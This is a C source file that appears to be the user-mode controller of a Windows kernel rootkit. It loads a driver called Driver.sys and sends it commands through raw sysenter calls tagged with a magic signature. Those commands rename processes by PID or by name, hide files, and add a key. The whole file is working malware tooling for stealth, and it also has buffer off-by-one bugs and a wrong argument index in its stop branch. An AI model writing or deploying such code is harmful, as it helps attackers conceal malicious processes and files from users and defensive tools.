#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include ".\..\command.h"
#include "install_driver.h"

#define sysenter __asm _emit 0x0F __asm _emit 0x34
#define SIGNATURE_SYSCALL 0xBAD0FACE
#define DRIVER_NAME "driver"
#define DRIVER_FILE "Driver.sys"

unsigned int AddressSystemCall;
__declspec(naked) void FastSystemCall(void) {
	__asm mov edx, esp
	__asm sysenter
}
__declspec(naked) void SysCall(void) {
	//__asm mov eax, <id>
	__asm mov edx, offset AddressSystemCall
	__asm call dword ptr[edx]
	__asm ret
}

int main(int argc, char* argv[]) {
	
	COMMAND cmd;
	unsigned int len;

	memset(&cmd, 0, sizeof(COMMAND));

	if (argc > 1) {
		if (!strcmp(argv[1], "0x26")) {
			cmd.flags = COMMAND_TEST_COMMAND;
			cmd.target = NULL;
			cmd.change = NULL;
			unsigned int cc = (unsigned int)NULL;
			__asm {
				push 0
				push 0
				lea eax, cmd
				push eax
				push SIGNATURE_SYSCALL
				mov eax, 0x26
			}
			AddressSystemCall = (unsigned int)FastSystemCall;
			SysCall();
		}
		// RENAME PROCESS PID
		else if (!strcmp(argv[1], "rpid")) {
			if (argc == 4) {
				len = strlen(argv[3]);
				cmd.change = malloc(len);
				strcpy((char*)cmd.change, argv[3]);

				cmd.target = (void*)strtoul(argv[2], NULL, 0);
				cmd.flags = COMMAND_RENAME_PROCESS | COMMAND_BUFFER_NUMBER;

				__asm {
					push 0
					push 0
					lea eax, cmd
					push eax
					push SIGNATURE_SYSCALL
					mov eax, 0x26
				}
				AddressSystemCall = (unsigned int)FastSystemCall;
				SysCall();
			}
			else printf("Error rename process\n");
		}
		// RENAME PROCESS NAME
		else if (!strcmp(argv[1], "rname")) {
			if (argc == 4) {
				len = strlen(argv[2]);
				cmd.target = malloc(len);
				strcpy((char*)cmd.target, argv[2]);

				len = strlen(argv[3]);
				cmd.change = malloc(len);
				strcpy((char*)cmd.change, argv[3]);

				cmd.flags = COMMAND_RENAME_PROCESS | COMMAND_BUFFER_POINTER;

				__asm {
					push 0
					push 0
					lea eax, cmd
					push eax
					push SIGNATURE_SYSCALL
					mov eax, 0x26
				}
				AddressSystemCall = (unsigned int)FastSystemCall;
				SysCall();
			}
			else printf("Error rename process\n");
		}
		else if (!strcmp(argv[1], "hfile")) {
			if (argc == 3) {
				len = strlen(argv[2]);
				cmd.target = malloc(len);
				strcpy((char*)cmd.target, argv[2]);

				cmd.flags = COMMAND_HIDE_FILE | COMMAND_BUFFER_POINTER;

				cmd.change = NULL;
				__asm {
					push 0
					push 0
					lea eax, cmd
					push eax
					push SIGNATURE_SYSCALL
					mov eax, 0x26
				}
				AddressSystemCall = (unsigned int)FastSystemCall;
				SysCall();
			}
			else printf("Error hide file\n");
		}
		else if (!strcmp(argv[1], "key")) {
			if (argc == 4) {
				len = strlen(argv[2]);
				cmd.target = malloc(len);
				strcpy((char*)cmd.target, argv[2]);

				len = strlen(argv[3]);
				cmd.change = malloc(len);
				strcpy((char*)cmd.change, argv[3]);

				cmd.flags = COMMAND_ADD_KEY | COMMAND_BUFFER_POINTER;

				__asm {
					push 0
					push 0
					lea eax, cmd
					push eax
					push SIGNATURE_SYSCALL
					mov eax, 0x26
				}
				AddressSystemCall = (unsigned int)FastSystemCall;
				SysCall();
			}
			else printf("Error hide add key\n");
		}
		else if (!strcmp(argv[1], "start")) {
			char buf[2 * MAX_PATH];

			GetFullPathNameA(DRIVER_FILE, 2 * MAX_PATH, buf, NULL);
			
			if (!InstallDriver(DRIVER_NAME, buf))
				return 0;
			if (!StartDriver(DRIVER_NAME))
				return 0;

		}
		else if (!strcmp(argv[2], "stop")) {

			if (!StopDriver(DRIVER_NAME))
				return 0;
			if (!RemoveDriver(DRIVER_NAME))
				return 0;

			printf("Driver unload");
		}
	}
	else {
		printf("\t\n%s command [argCommand1 [argCommand2 [...]]]\n", argv[0]);
	}

	return 0;
}